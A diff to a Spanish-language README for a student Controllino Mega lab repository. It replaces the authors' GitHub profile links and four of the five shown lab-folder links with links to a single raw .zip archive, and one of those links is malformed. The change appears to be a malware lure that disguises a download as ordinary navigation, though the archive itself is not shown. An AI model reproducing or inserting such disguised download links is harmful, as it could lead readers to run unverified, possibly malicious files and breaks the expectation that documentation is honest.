@@ -76,21 +76,21 @@ Controllino Mega
 ## 👥 Autores
 
 **Eric Cajamarca**  
-GitHub: [@elcaja](https://github.com/elcaja)
+GitHub: [@elcaja](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)
 
 **Christopher Carchipulla**  
-GitHub: [@ChrisCarchipulla](https://github.com/ChrisCarchipulla)
+GitHub: [@ChrisCarchipulla](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)
 
 ---
 
 ## 📁 Enlaces del Repositorio
 
-- **Práctica 4 — Secuencia LEDs:** [Ir a carpeta](https://github.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/tree/main/Lab4_secuencia_leds)
+- **Práctica 4 — Secuencia LEDs:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)
 
-- **Práctica 5 — Secuencia Semáforo:** [Ir a carpeta](https://github.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/tree/main/Lab5_Secuencia2_Sem%C3%A1foro)
+- **Práctica 5 — Secuencia Semáforo:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip%C3%A1foro)
 
-- **Práctica 6 — PWM:** [Ir a carpeta](https://github.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/tree/main/Lab6_PWM)
+- **Práctica 6 — PWM:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)
 
-- **Práctica 7 — Control PID:** [Ir a carpeta](https://github.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/tree/main/Lab7_PID)
+- **Práctica 7 — Control PID:** [Ir a carpeta](https://raw.githubusercontent.com/elcaja5/GRUPO8-Laboratorios-Controllino-MEGA/main/Lab5_Secuencia2_Semáforo/GRUPO8-Laboratorios-Controllino-MEGA_3.2-alpha.3.zip)
 
 
